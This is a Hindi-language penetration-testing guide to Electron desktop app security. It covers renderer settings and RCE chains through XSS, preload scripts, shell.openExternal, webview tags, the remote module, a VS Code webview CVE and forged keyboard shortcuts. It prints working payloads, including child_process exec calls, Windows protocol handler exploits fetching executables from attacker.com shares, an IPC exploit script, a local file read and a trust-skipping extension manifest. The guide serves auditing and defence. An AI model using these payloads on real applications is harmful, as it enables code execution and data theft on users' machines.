# Electron डेस्कटॉप ऐप्स

{{#include ../../banners/hacktricks-training.md}}

## परिचय

Electron एक विशेषाधिकारयुक्त **Node.js** main process को **Chromium** renderer processes के साथ जोड़ता है। Electron कोई web browser नहीं है: application code जानबूझकर filesystem और shell access जैसी क्षमताएँ उपलब्ध करा सकता है, इसलिए untrusted content लोड करने के लिए किसी सामान्य वेबसाइट की तुलना में अधिक सख्त boundary design की आवश्यकता होती है।<sup>[[21]](#references)</sup>

Electron application code को आमतौर पर `.asar` archive में पैकेज किया जाता है। Source की समीक्षा करने से पहले इसे extract करें:

```bash
npx asar extract app.asar destfolder #Extract everything
npx asar extract-file app.asar main.js #Extract just a file
```

ऐप्लिकेशन का `package.json` उसका मुख्य एंट्री पॉइंट बताता है। यह फ़ाइल आमतौर पर renderer windows बनाती है और उनकी सुरक्षा-संवेदनशील `webPreferences` सेट करती है।

```json
{
  "name": "standard-notes",
  "main": "./app/index.js",
```

Electron में दो प्रमुख process प्रकार होते हैं:

- Main Process (इसे NodeJS का पूर्ण access होता है)
- Renderer Process (सुरक्षा कारणों से इसका NodeJS access सीमित होना चाहिए)

![Electron Desktop Apps - Introduction: Renderer Process (सुरक्षा कारणों से इसका NodeJS access सीमित होना चाहिए)](<../../images/image (182).png>)

**renderer process** एक browser window होगा जो एक file लोड करता है:<sup>[[3]](#references)</sup>

```javascript
const { BrowserWindow } = require("electron")
let win = new BrowserWindow()

//Open Renderer Process
win.loadURL(`file://path/to/index.html`)
```

**main process** प्रत्येक renderer process को configure करता है, आमतौर पर `BrowserWindow` बनाते समय। सुरक्षित settings से renderer compromise के native code execution में बदलने की संभावना कम होती है, लेकिन वे untrusted content को अपने-आप सुरक्षित नहीं बनातीं।<sup>[[21]](#references)[[22]](#references)</sup>

कम-से-कम इन renderer preferences की समीक्षा करें:<sup>[[22]](#references)</sup>

- **`nodeIntegration`** डिफ़ॉल्ट रूप से `false` होता है। इसे enabled करने से renderer JavaScript को Node.js APIs का access मिलता है और उस renderer का sandbox भी disabled हो जाता है।
- **`contextIsolation`** डिफ़ॉल्ट रूप से `true` होता है। यह page के JavaScript context को preload scripts और Electron internals द्वारा उपयोग किए जाने वाले context से अलग रखता है।
- **`preload`** के लिए कोई default path नहीं होता। Configure की गई preload script, page scripts से पहले चलती है और `contextBridge` के माध्यम से सीमित दायरे वाली APIs उपलब्ध करा सकती है।
- **`sandbox`** Electron 20 से डिफ़ॉल्ट रूप से `true` है। यह renderer के operating-system resources तक access को सीमित करता है; `nodeIntegration: true` सेट करने से यह disabled हो जाता है।
- **`nodeIntegrationInWorker`** डिफ़ॉल्ट रूप से `false` होता है और Web Workers में Node.js integration को नियंत्रित करता है।
- **`nodeIntegrationInSubFrames`** डिफ़ॉल्ट रूप से `false` होता है।
  - यदि **`nodeIntegration`** **enabled** है, तो इससे Electron application के भीतर **iframes में loaded** web pages में **Node.js APIs** का उपयोग संभव होगा।
  - यदि **`nodeIntegration`** **disabled** है, तो preloads iframe में load होंगे

Configuration का उदाहरण:

```javascript
const mainWindowOptions = {
  title: "Discord",
  backgroundColor: getBackgroundColor(),
  width: DEFAULT_WIDTH,
  height: DEFAULT_HEIGHT,
  minWidth: MIN_WIDTH,
  minHeight: MIN_HEIGHT,
  transparent: false,
  frame: false,
  resizable: true,
  show: isVisible,
  webPreferences: {
    blinkFeatures: "EnumerateDevices,AudioOutputDevices",
    nodeIntegration: false,
    contextIsolation: false,
    sandbox: false,
    nodeIntegrationInSubFrames: false,
    preload: _path2.default.join(__dirname, "mainScreenPreload.js"),
    nativeWindowOpen: true,
    enableRemoteModule: false,
    spellcheck: true,
  },
}
```

[यहाँ](https://7as.es/electron/nodeIntegration_rce.txt) से कुछ **RCE payloads**:<sup>[[7]](#references)</sup>

```html
Example Payloads (Windows):
<img
  src="x"
  onerror="alert(require('child_process').execSync('calc').toString());" />

Example Payloads (Linux & MacOS):
<img
  src="x"
  onerror="alert(require('child_process').execSync('gnome-calculator').toString());" />
<img
  src="x"
  onerror="alert(require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator').toString());" />
<img
  src="x"
  onerror="alert(require('child_process').execSync('id').toString());" />
<img
  src="x"
  onerror="alert(require('child_process').execSync('ls -l').toString());" />
<img
  src="x"
  onerror="alert(require('child_process').execSync('uname -a').toString());" />
```

### ट्रैफ़िक कैप्चर करें

start-main कॉन्फ़िगरेशन में बदलाव करें और किसी proxy का उपयोग जोड़ें, जैसे:

```javascript
"start-main": "electron ./dist/main/main.js --proxy-server=127.0.0.1:8080 --ignore-certificateerrors",
```

## REA के साथ static ASAR-to-native boundary tracing

**REA** JavaScript bootstrap को execute किए बिना ASAR या extracted application directory को read कर सकता है। इसका application graph package entry points, bundled modules, `BrowserWindow` और preload settings, `contextBridge` members, IPC registrations, native add-on requests और source-map identities को record करता है। इससे renderer-exposed capability को privileged main-process handler तक trace करने की शुरुआत मिलती है।<sup>[[23]](#references)[[24]](#references)</sup>

```bash
rea analyze-javascript-application /absolute/path/to/app.asar --json > application-evidence.json
```

एक literal feature string के लिए, पूरे Evidence record को `application` के रूप में पास करें और seed को target में देखे गए seed से बदलें:<sup>[[25]](#references)</sup>

```bash
node --input-type=module -e '
import { readFileSync, writeFileSync } from "node:fs";
const application = JSON.parse(readFileSync("application-evidence.json", "utf8"));
writeFileSync("trace-input.json", JSON.stringify({
  application, seed: { kind: "string", value: "search-result" }, direction: "both"
}));'
rea trace-application-feature ./trace-input.json --json
```

वही `trace_application_feature` workflow किसी देखे गए literal API member, IPC channel या module को seed के रूप में भी स्वीकार करता है। लौटाए गए source locations के आधार पर परिणामी handler path, validation candidates और native handoff की जाँच करें। Renderer का `invoke` उसी exact literal channel पर केवल एक unique `ipcMain.handle`/`handleOnce` candidate से मेल खाता है; `send` के लिए भी एक unique `ipcMain.on`/`once`/`addListener` candidate आवश्यक है। Dynamic या duplicate handlers अनसुलझे रहते हैं। अनुरोधित `.node` member सत्यापित native export नहीं है; यह निष्कर्ष निकालने से पहले मिलते-जुलते Hopper/Ghidra Evidence का artifact digest समान होना चाहिए। Static reachability से यह भी साबित नहीं होता कि path execute हुआ था।<sup>[[24]](#references)[[25]](#references)</sup>

Renderer-to-main trust boundary और handler validation के लिए, [Electron contextIsolation RCE via IPC](electron-contextisolation-rce-via-ipc.md) देखें।

Provider-bound native follow-up के लिए, [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/#evidence-backed-native-investigation-with-rea) देखें।

## Electron auto-update attack surface

Release-feed integrity, rollback, signed-channel confusion और staging-file TOCTOU के लिए, [Electron auto-update trust boundaries](electron-auto-update-trust-boundaries.md) देखें।

## Electron Local Code Injection

किसी installed app पर local write या instrumentation access के साथ, ASAR/main-process और V8 snapshot paths के साथ-साथ OS-specific links के लिए [Electron local code injection and snapshot tampering](electron-local-code-injection-and-snapshot-tampering.md) देखें।

## RCE: XSS + nodeIntegration

अगर **nodeIntegration** को **on** पर सेट किया गया है, तो कोई web page, सिर्फ़ `require()` को call करके, आसानी से Node.js features का उपयोग कर सकता है। उदाहरण के लिए, Windows पर calc application चलाने का तरीका यह है:

```html
<script>
  require("child_process").exec("calc")
  // or
  top.require("child_process").exec("open /System/Applications/Calculator.app")
</script>
```

<figure><img src="../../images/image (1110).png" alt=""><figcaption></figcaption></figure>

## RCE: preload

इस सेटिंग में निर्दिष्ट script को renderer में अन्य scripts से पहले l**लोड किया जाता है**, इसलिए इसे **Node APIs तक असीमित पहुँच** प्राप्त होती है:

```javascript
new BrowserWindow{
  webPreferences: {
    nodeIntegration: false,
    preload: _path2.default.join(__dirname, 'perload.js'),
  }
});
```

इसलिए, script node-features को pages में export कर सकती है:

```javascript:preload.js
typeof require === "function"
window.runCalc = function () {
  require("child_process").exec("calc")
}
```

```html:index.html
<body>
  <script>
    typeof require === "undefined"
    runCalc()
  </script>
</body>
```

> [!NOTE] > **अगर `contextIsolation` चालू है, तो यह काम नहीं करेगा**

## RCE: XSS + contextIsolation

_**contextIsolation**_ **वेब पेज की scripts और Electron के आंतरिक JavaScript code के बीच अलग-अलग contexts बनाता है**, ताकि हर code का JavaScript execution दूसरे को प्रभावित न करे। RCE की संभावना को खत्म करने के लिए यह एक आवश्यक feature है।

अगर contexts isolated नहीं हैं, तो attacker:

1. **renderer में arbitrary JavaScript execute** कर सकता है (XSS या external sites पर navigation के ज़रिए)
2. preload या Electron के आंतरिक code में इस्तेमाल होने वाले **built-in method को अपने function से overwrite** कर सकता है
3. **overwritten function का इस्तेमाल trigger** कर सकता है
4. RCE?

ऐसी 2 जगहें हैं जहाँ built-in methods overwrite किए जा सकते हैं: preload code में या Electron के आंतरिक code में:


{{#ref}}
electron-contextisolation-rce-via-preload-code.md
{{#endref}}


{{#ref}}
electron-contextisolation-rce-via-electron-internal-code.md
{{#endref}}


{{#ref}}
electron-contextisolation-rce-via-ipc.md
{{#endref}}

### Click event को Bypass करना

अगर किसी link पर click करने पर restrictions लागू होती हैं, तो सामान्य left click के बजाय **middle click करके** आप उन्हें bypass कर सकते हैं.

```javascript
window.addEventListener('click', (e) => {
```

## shell.openExternal के जरिए RCE

इन उदाहरणों के बारे में अधिक जानकारी के लिए [https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8](https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8) और [https://benjamin-altpeter.de/shell-openexternal-dangers/](https://benjamin-altpeter.de/shell-openexternal-dangers/)<sup>[[8]](#references)[[9]](#references)</sup> देखें।

Electron desktop application deploy करते समय, `nodeIntegration` और `contextIsolation` की सही settings सुनिश्चित करना महत्वपूर्ण है। यह स्थापित है कि इन settings के लागू होने पर main process से preload scripts या Electron के native code को target करने वाले **client-side remote code execution (RCE)** को प्रभावी ढंग से रोका जा सकता है।

जब कोई user links पर interact करता है या नई windows खोलता है, तो कुछ खास event listeners trigger होते हैं, जो application की security और functionality के लिए महत्वपूर्ण हैं:

```javascript
webContents.on("new-window", function (event, url, disposition, options) {}
webContents.on("will-navigate", function (event, url) {}
```

इन listeners को **desktop application द्वारा override** किया जाता है, ताकि इसका अपना **business logic** लागू किया जा सके। Application यह तय करती है कि navigated link को अंदर खोला जाना चाहिए या किसी बाहरी web browser में। यह निर्णय आमतौर पर `openInternally` function के माध्यम से लिया जाता है। यदि यह function `false` लौटाता है, तो इसका अर्थ है कि link को `shell.openExternal` function का उपयोग करके बाहरी रूप से खोला जाना चाहिए।

**यहाँ सरल pseudocode दिया गया है:**

![https://miro.medium.com/max/1400/1*iqX26DMEr9RF7nMC1ANMAA.png](<../../images/image (261).png>)

![https://miro.medium.com/max/1400/1*ZfgVwT3X1V_UfjcKaAccag.png](<../../images/image (963).png>)

Electron JS security best practices के अनुसार, `openExternal` function में untrusted content स्वीकार नहीं करना चाहिए, क्योंकि इससे विभिन्न protocols के माध्यम से RCE हो सकता है। Operating systems ऐसे अलग-अलग protocols का समर्थन करते हैं, जो RCE को trigger कर सकते हैं। इस विषय पर विस्तृत उदाहरणों और आगे की व्याख्या के लिए [यह संसाधन](https://positive.security/blog/url-open-rce#windows-10-19042) देखा जा सकता है, जिसमें इस vulnerability का exploit करने में सक्षम Windows protocol के उदाहरण शामिल हैं।<sup>[[10]](#references)</sup>

macos में, `openExternal` function का exploit करके arbitrary commands execute किए जा सकते हैं, जैसे `shell.openExternal('file:///System/Applications/Calculator.app')`।

**Windows protocol exploits के उदाहरणों में शामिल हैं:**

```html
<script>
  window.open(
    "ms-msdt:id%20PCWDiagnostic%20%2Fmoreoptions%20false%20%2Fskip%20true%20%2Fparam%20IT_BrowseForFile%3D%22%5Cattacker.comsmb_sharemalicious_executable.exe%22%20%2Fparam%20IT_SelectProgram%3D%22NotListed%22%20%2Fparam%20IT_AutoTroubleshoot%3D%22ts_AUTO%22"
  )
</script>

<script>
  window.open(
    "search-ms:query=malicious_executable.exe&crumb=location:%5C%5Cattacker.com%5Csmb_share%5Ctools&displayname=Important%20update"
  )
</script>

<script>
  window.open(
    "ms-officecmd:%7B%22id%22:3,%22LocalProviders.LaunchOfficeAppForResult%22:%7B%22details%22:%7B%22appId%22:5,%22name%22:%22Teams%22,%22discovered%22:%7B%22command%22:%22teams.exe%22,%22uri%22:%22msteams%22%7D%7D,%22filename%22:%22a:/b/%2520--disable-gpu-sandbox%2520--gpu-launcher=%22C:%5CWindows%5CSystem32%5Ccmd%2520/c%2520ping%252016843009%2520&&%2520%22%22%7D%7D"
  )
</script>
```

## RCE: webviewTag + vulnerable preload IPC + shell.openExternal

यह vuln **[इस report](https://flatt.tech/research/posts/escaping-electron-isolation-with-obsolete-feature/)** में पाया जा सकता है।<sup>[[11]](#references)</sup>

**webviewTag** एक **deprecated feature** है, जो **renderer process** में **NodeJS** के इस्तेमाल की अनुमति देता है। इसे disabled रखना चाहिए, क्योंकि इससे preload context के अंदर इस तरह script load की जा सकती है:

```xml
<webview src="https://example.com/" preload="file://malicious.example/test.js"></webview>
```

इसलिए, कोई हमलावर जो मनमाना पेज लोड करने में सफल हो जाए, उस टैग का इस्तेमाल **मनमानी preload script लोड करने** के लिए कर सकता था।

इसके बाद इस preload script का दुरुपयोग करके **vulnerable IPC service (`skype-new-window`)** को कॉल किया गया, जो RCE पाने के लिए **`shell.openExternal`** को कॉल कर रही थी:

```javascript
(async() => {
    const { ipcRenderer } = require("electron");
    await ipcRenderer.invoke("skype-new-window", "https://example.com/EXECUTABLE_PATH");
    setTimeout(async () => {
        const username = process.execPath.match(/C:\\Users\\([^\\]+)/);
        await ipcRenderer.invoke("skype-new-window", `file:///C:/Users/${username[1]}/Downloads/EXECUTABLE_NAME`);
    }, 5000);
})();
```

## आंतरिक फ़ाइलें पढ़ना: XSS + contextIsolation

**`contextIsolation` को बंद करने से `<webview>` tags का उपयोग संभव हो जाता है**, जो `<iframe>` की तरह स्थानीय फ़ाइलों को पढ़ने और exfiltrate करने के लिए इस्तेमाल किए जा सकते हैं। दिए गए उदाहरण में दिखाया गया है कि इस vulnerability का फायदा उठाकर आंतरिक फ़ाइलों की सामग्री कैसे पढ़ी जा सकती है:<sup>[[2]](#references)</sup>

![RCE: webviewTag + vulnerable preload IPC + shell.openExternal - आंतरिक फ़ाइलें पढ़ना: XSS + contextIsolation: contextIsolation को बंद करने से tags का उपयोग संभव हो जाता है, जो की तरह हैं, ...](<../../images/1 u1jdRYuWAEVwJmf_F2ttJg (1).png>)

इसके अलावा, **आंतरिक फ़ाइल पढ़ने** का एक और तरीका साझा किया गया है, जो Electron desktop app में स्थानीय फ़ाइल पढ़ने की एक गंभीर vulnerability को उजागर करता है। इसमें application का फायदा उठाने और data exfiltrate करने के लिए एक script inject की जाती है:

```html
<br /><br /><br /><br />
<h1>
  pwn<br />
  <iframe onload="j()" src="/etc/hosts">xssxsxxsxs</iframe>
  <script type="text/javascript">
    function j() {
      alert(
        "pwned contents of /etc/hosts :\n\n " +
          frames[0].document.body.innerText
      )
    }
  </script>
</h1>
```

## **RCE: XSS + पुराना Chromium**

अगर एप्लिकेशन के साथ बंडल किया गया **Chromium** वर्शन पुराना है और उसमें ज्ञात vulnerabilities हैं, तो उसका exploit करके XSS को RCE में बदलना संभव हो सकता है।<sup>[[20]](#references)</sup>\
इसका एक उदाहरण इस **writeup** में देखें: [https://blog.electrovolt.io/posts/discord-rce/](https://blog.electrovolt.io/posts/discord-rce/)<sup>[[12]](#references)</sup>

## **Internal URL regex bypass के ज़रिए XSS Phishing**

अगर आपको XSS मिलता है, लेकिन आप **RCE trigger नहीं कर सकते या internal files चुरा नहीं सकते**, तो भी **phishing के ज़रिए credentials चुराने** की कोशिश कर सकते हैं।<sup>[[1]](#references)</sup>

सबसे पहले, यह पता लगाने के लिए frontend code देखें कि नया URL खोलने पर क्या होता है:

```javascript
webContents.on("new-window", function (event, url, disposition, options) {} // opens the custom openInternally function (it is declared below)
webContents.on("will-navigate", function (event, url) {}                    // opens the custom openInternally function (it is declared below)
```

**`openInternally`** को call यह तय करता है कि प्लेटफ़ॉर्म लिंक **desktop window** में खुलेगा या third-party resource सिस्टम ब्राउज़र में खुलेगा।

अगर फ़ंक्शन के URL allowlist regex को bypass किया जा सकता है—उदाहरण के लिए, क्योंकि hostname के dots को escape नहीं किया गया था—तो attacker, XSS का दुरुपयोग करके attacker-controlled infrastructure पर एक भरोसेमंद दिखने वाला credential prompt खोल सकता है:

```html
<script>
  window.open("<http://subdomainagoogleq.com/index.html>")
</script>
```

## `file://` Protocol

[Electron security guide](https://www.electronjs.org/docs/latest/tutorial/security#18-avoid-usage-of-the-file-protocol-and-prefer-usage-of-custom-protocols) में बताए अनुसार, **`file://`** पर चलने वाले पेजों को फ़ाइलों तक व्यापक पहुँच मिलती है। इसलिए, **XSS का उपयोग उपयोगकर्ता की मशीन से मनमानी फ़ाइलें लोड करने के लिए किया जा सकता है**। सही ढंग से डिज़ाइन किया गया **custom protocol** पहुँच को फ़ाइलों के किसी खास समूह तक सीमित कर सकता है।<sup>[[21]](#references)</sup>

## Remote module

Electron Remote module, **renderer processes को main process APIs तक पहुँचने** देता है, जिससे Electron application के भीतर संचार आसान होता है। हालाँकि, इस मॉड्यूल को सक्षम करने से सुरक्षा के गंभीर जोखिम पैदा होते हैं। इससे application का attack surface बढ़ता है और वह cross-site scripting (XSS) जैसे हमलों की चपेट में अधिक आ जाता है।

> [!TIP]
> हालाँकि **remote** module, main से renderer processes तक कुछ APIs उपलब्ध कराता है, लेकिन केवल components का दुरुपयोग करके RCE हासिल करना सीधा नहीं है। फिर भी, components संवेदनशील जानकारी उजागर कर सकते हैं।

> [!WARNING]
> कई apps जो अब भी remote module का उपयोग करते हैं, ऐसा इस तरह करते हैं कि renderer process में **NodeIntegration सक्षम होना ज़रूरी होता है**, जो **सुरक्षा का बहुत बड़ा जोखिम** है।

Electron का built-in `remote` module deprecated कर दिया गया और फिर हटा दिया गया; जिन applications को अब भी इसके मॉडल की ज़रूरत है, वे अलग `@electron/remote` package का उपयोग कर सकती हैं। सुरक्षा और performance पर पड़ने वाले प्रभावों के कारण, untrusted renderers को remote-जैसी क्षमताएँ देने से बचें।

`@electron/remote` के साथ, इसे पहले **main process में initialize करना होगा**:

```javascript
const remoteMain = require('@electron/remote/main')
remoteMain.initialize()
[...]
function createMainWindow() {
  mainWindow = new BrowserWindow({
  [...]
  })
  remoteMain.enable(mainWindow.webContents)
```

इसके बाद renderer process module से objects import कर सकता है:

```javascript
import { dialog, getCurrentWindow } from '@electron/remote'
```

**[ब्लॉग पोस्ट](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)** remote module के **`app`** object द्वारा exposed कुछ दिलचस्प **functions** बताती है:<sup>[[6]](#references)</sup>

- **`app.relaunch([options])`**  
   - मौजूदा instance को **exit** करके और नया instance **launch** करके application को **restart** करता है। **App updates** या बड़े **state changes** के लिए उपयोगी है।
- **`app.setAppLogsPath([path])`**  
   - **App logs** store करने के लिए directory **define** करता है या **बनाता** है। **`app.getPath()`** या **`app.setPath(pathName, newPath)`** का उपयोग करके logs **retrieve** या **modify** किए जा सकते हैं।
- **`app.setAsDefaultProtocolClient(protocol[, path, args])`**  
   - मौजूदा executable को निर्दिष्ट **protocol** के लिए **default handler** के रूप में **register** करता है। ज़रूरत पड़ने पर आप **custom path** और **arguments** दे सकते हैं।
- **`app.setUserTasks(tasks)`**  
   - (Windows पर) **Jump List** की **Tasks category** में tasks **जोड़ता** है। हर task यह नियंत्रित कर सकता है कि app कैसे **launch** हो या कौन-से **arguments** पास किए जाएँ।
- **`app.importCertificate(options, callback)`**  
   - **PKCS#12 certificate** को system के **certificate store** में **import** करता है (केवल Linux पर)। परिणाम को संभालने के लिए **callback** का उपयोग किया जा सकता है।
- **`app.moveToApplicationsFolder([options])`**  
   - (macOS पर) application को **Applications folder** में **move** करता है। Mac users के लिए **standard installation** सुनिश्चित करने में मदद करता है।
- **`app.setJumpList(categories)`**  
   - (Windows पर) **custom Jump List** को **set** या **remove** करता है। आप यह व्यवस्थित करने के लिए **categories** निर्दिष्ट कर सकते हैं कि tasks user को कैसे दिखाई दें।
- **`app.setLoginItemSettings(settings)`**  
   - यह **configure** करता है कि **login** के समय कौन-से **executables** अपने **options** के साथ launch हों (केवल macOS और Windows पर)।
  
उदाहरण:

```javascript
Native.app.relaunch({args: [], execPath: "/System/Applications/Calculator.app/Contents/MacOS/Calculator"});
Native.app.exit()
```

## systemPreferences module

Electron में system preferences तक पहुँचने और **system events emit** करने के लिए **प्राथमिक API**। **subscribeNotification**, **subscribeWorkspaceNotification**, **getUserDefault**, और **setUserDefault** जैसे methods, सभी इस module का **हिस्सा हैं**।

**उपयोग का उदाहरण:**

```javascript
const { systemPreferences } = require('electron');

// Subscribe to a specific notification
systemPreferences.subscribeNotification('MyCustomNotification', (event, userInfo) => {
  console.log('Received custom notification:', userInfo);
});

// Get a user default key from macOS
const recentPlaces = systemPreferences.getUserDefault('NSNavRecentPlaces', 'array');
console.log('Recent Places:', recentPlaces);
```

### **subscribeNotification / subscribeWorkspaceNotification**

* **NSDistributedNotificationCenter का उपयोग करके native macOS notifications** सुनता है।  
* **macOS Catalina** से पहले, CFNotificationCenterAddObserver को **nil** पास करके आप **सभी** distributed notifications को sniff कर सकते थे।  
* **Catalina / Big Sur** के बाद, sandboxed apps अब भी notifications को **नाम के आधार पर** register करके **कई events** (उदाहरण के लिए, **screen locks/unlocks**, **volume mounts**, **network activity** आदि) को **subscribe** कर सकते हैं।

### **getUserDefault / setUserDefault**

* macOS पर **application** या **global** preferences स्टोर करने वाले **NSUserDefaults** के साथ **इंटरफ़ेस** करता है।
    
* **getUserDefault** संवेदनशील जानकारी, जैसे **हाल ही में उपयोग किए गए file locations** या **उपयोगकर्ता का भौगोलिक स्थान**, **retrive** कर सकता है।
    
* **setUserDefault** इन preferences को **modify** कर सकता है, जिससे किसी app की **configuration** प्रभावित हो सकती है।
    
* **पुराने Electron versions** (v8.3.0 से पहले) में, केवल NSUserDefaults का **standard suite** ही **accessible** था।

## Shell.showItemInFolder

यह function दी गई file को file manager में दिखाता है। प्रभावित platforms और versions पर, इस interaction से **file अपने-आप execute हो सकती थी**।

अधिक जानकारी के लिए देखें [https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)<sup>[[6]](#references)</sup>

## Content Security Policy

Electron apps में **XSS attacks रोकने** के लिए **Content Security Policy (CSP)** होनी चाहिए। **CSP** एक **security standard** है, जो browser में **untrusted code के execution को रोकने** में मदद करती है।

इसे आमतौर पर **`main.js`** file में या **`index.html`** template में, CSP को **meta tag** के अंदर रखकर **configure** किया जाता है।

अधिक जानकारी के लिए देखें:


{{#ref}}
../../pentesting-web/content-security-policy-csp-bypass/README.md
{{#endref}}


## RCE: Webview CSP + postMessage trust + local file loading (VS Code 1.63)

इस real-world chain ने Visual Studio Code 1.63 (CVE-2021-43908) को प्रभावित किया और दिखाया कि CSP, postMessage और scheme handlers के गलत configuration होने पर webview में एक markdown-driven XSS को full RCE तक कैसे बढ़ाया जा सकता है। Public PoC: https://github.com/Sudistark/vscode-rce-electrovolt<sup>[[13]](#references)</sup>

Attack chain का अवलोकन
- webview CSP के ज़रिए पहला XSS: Generated CSP में `style-src 'self' 'unsafe-inline'` शामिल था, जिससे `vscode-webview://` context में inline/style-based injection संभव हुआ। Payload ने target webview के extensionId को exfiltrate करने के लिए `/stealID` पर beacon भेजा।
- Target webview URL बनाना: Leaked ID का उपयोग करके `vscode-webview://<extensionId>/.../<publicUrl>` बनाया गया।
- postMessage trust के ज़रिए दूसरा XSS: Outer webview ने strict origin/type checks के बिना `window.postMessage` पर भरोसा किया और `allowScripts: true` के साथ attacker के HTML को load किया।
- Scheme/path rewriting के ज़रिए local file loading: Payload ने `file:///...` को `vscode-file://vscode-app/...` में rewrite किया और `exploit.md` की जगह `RCE.html` का उपयोग किया। इसने कमजोर path validation का दुरुपयोग करके एक privileged local resource load किया।
- Node-enabled context में RCE: Load किए गए HTML को Node APIs उपलब्ध होने के साथ execute किया गया, जिससे OS command execution संभव हुआ।

Final context में RCE का उदाहरण primitive
```js
// RCE.html (executed in a Node-enabled webview context)
require('child_process').exec('calc.exe');            // Windows
require('child_process').exec('/System/Applications/Calculator.app'); // macOS
```

postMessage trust समस्याओं पर संबंधित पठन:

{{#ref}}
../../pentesting-web/postmessage-vulnerabilities/README.md
{{#endref}}

## VS Code / github.dev: synthetic webview shortcuts + declarative extension command bridges

जून 2026 में VS Code webview escape का एक अलग वर्ग सामने आया: **notebook/preview webview के अंदर untrusted JavaScript विशेषाधिकार-युक्त global shortcuts बना सकता था**, क्योंकि webview preload `keydown` डेटा host workbench को भेजता था और host उसे वास्तविक user input मानकर संभालता था।<sup>[[14]](#references)</sup>

यह IDE trust-boundary attacks के व्यापक इतिहास का हिस्सा है, जिसमें project-controlled content विशेषाधिकार-युक्त editor features तक पहुँचता है।<sup>[[19]](#references)</sup>

### Boundary failure

यदि कोई cross-origin/sandboxed webview attacker-controlled keyboard fields (`key`, `code`, `keyCode`, modifiers, `repeat`) को **`event.isTrusted` जाँचे बिना** किसी विशेषाधिकार-युक्त `postMessage`/message-port bridge में कॉपी करता है, तो webview के अंदर JavaScript ये workbench shortcuts चला सकता है:<sup>[[14]](#references)[[15]](#references)</sup>

```javascript
window.dispatchEvent(
  new KeyboardEvent("keydown", {
    key: "a",
    code: "KeyA",
    keyCode: 65,
    ctrlKey: true,
    shiftKey: true,
  })
)
```

यह खास तौर पर तब उपयोगी होता है जब browser **synthetic typing को ब्लॉक करता है**। Scripted key events आम तौर पर HTML `<input>` elements में **मनमाना text टाइप नहीं कर सकते**, लेकिन वे फिर भी ऐसे shortcuts trigger कर सकते हैं जो सीधे `keydown` को consume करते हैं।

### व्यावहारिक दुरुपयोग के तरीके

- **Shortcut-केंद्रित UI का दुरुपयोग:** commands टाइप करने की कोशिश करने के बजाय notification acceptance, palette navigation, focused-button activation या menu movement जैसी global bindings को target करें।
- **Workspace metadata से अनुमानित privileged prompts:** repository द्वारा नियंत्रित `.vscode/extensions.json` किसी attacker extension की सिफारिश कर सकता है और ऐसा अनुमानित install notification बना सकता है जिसे `Ctrl+Shift+A` जैसे shortcut से स्वीकार किया जा सकता है।
- **Command bridge के रूप में declarative extension manifest:** भले ही web VS Code में CSP द्वारा local workspace extension code ब्लॉक हो, declarative `package.json` contributions फिर भी load हो सकते हैं। `.vscode/extensions` के अंतर्गत कोई local extension ऐसा keybinding register कर सकता है जो `runCommands` और फिर `workbench.extensions.installExtension` जैसे privileged internal command को call करे।<sup>[[14]](#references)[[18]](#references)</sup>

Manifest pattern का उदाहरण:

```json
{
  "contributes": {
    "keybindings": [{
      "key": "ctrl+f1",
      "command": "runCommands",
      "args": {"commands": [{
        "command": "workbench.extensions.installExtension"
      }]}
    }]
  }
}
```

- **अविश्वसनीय metadata से उपलब्ध छिपे security flags:** यदि internal command attacker-controlled arguments स्वीकार करता है, जैसे `{"context":{"skipPublisherTrust":true}}`, तो declarative metadata trust dialog को दबा सकता है और Marketplace/CDN-hosted extension install कर सकता है, जो अंततः attacker code execute करता है।
- **Trusted-workspace का दुरुपयोग:** यदि remote/web workspaces को अपने-आप trusted माना जाता है, तो local workspace extensions repository content से privileged editor actions तक पहुँचने का एक high-value bridge बन जाते हैं।
- **Compromise के बाद दायरे का विस्तार:** extension execution के बाद जाँचें कि editor extensions को कौन-से tokens उपलब्ध कराता है। `github.dev` में चुराया गया GitHub token खुले repository से आगे भी मान्य था, इसलिए `https://api.github.com/user/repos` को query करने से पहुँच योग्य अन्य private repositories की सूची मिल गई।

### ऑडिट नोट्स

- **webview-to-host input forwarding** को privilege boundary मानें; untrusted frames से synthetic key/click events को host में दोबारा dispatch कभी न करें।
- संवेदनशील commands के **अंदर** authorization लागू करें। Caller द्वारा दिए गए command context को स्वीकार न करें, जो `skipPublisherTrust` जैसे internal flags सेट कर सकता हो।
- यह न मानें कि executable local extension code को block करना ही पर्याप्त है; workspace-controlled manifests के **declarative contributions** (`keybindings`, `menus`, `commands`, tasks) की भी समीक्षा करें।
- June 3, 2026 के fixes ने forwarded events में `isTrusted` जोड़ा, notebook webviews में untrusted key forwarding बंद किया और caller-supplied install-command context स्वीकार करना बंद किया।<sup>[[16]](#references)[[17]](#references)</sup>

## **Tools**

क्यूरेटेड **awesome-electronjs-hacking** collection में अतिरिक्त research, tooling और vulnerable-application resources उपलब्ध हैं।<sup>[[5]](#references)</sup>

- [**Electronegativity**](https://github.com/doyensec/electronegativity) Electron-based applications में misconfigurations और security anti-patterns की पहचान करने वाला tool है।
- [**Electrolint**](https://github.com/ksdmitrieva/electrolint) Electron applications के लिए एक open source VS Code plugin है, जो Electronegativity का उपयोग करता है।
- [**nodejsscan**](https://github.com/ajinabraham/nodejsscan) vulnerable third-party libraries की जाँच करता है।
- [**Electro.ng**](https://electro.ng/) एक commercial Electron security-analysis tool है।

## Labs

[https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s](https://www.youtube.com/watch?v=xILfQGkLXQo&t=22s) पर आपको vulnerable Electron apps exploit करने के लिए एक lab मिल सकती है।<sup>[[4]](#references)</sup>

ये commands lab में आगे बढ़ने में आपकी मदद करती हैं:

```bash
# Download apps from these URLs
# Vuln to nodeIntegration
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable1.zip
# Vuln to contextIsolation via preload script
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable2.zip
# Vulnerable to IPC-based RCE
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable3.zip

# Get inside the electron app and check for vulnerabilities
npm audit

# How to use electronegativity
npm install @doyensec/electronegativity -g
electronegativity -i vulnerable1

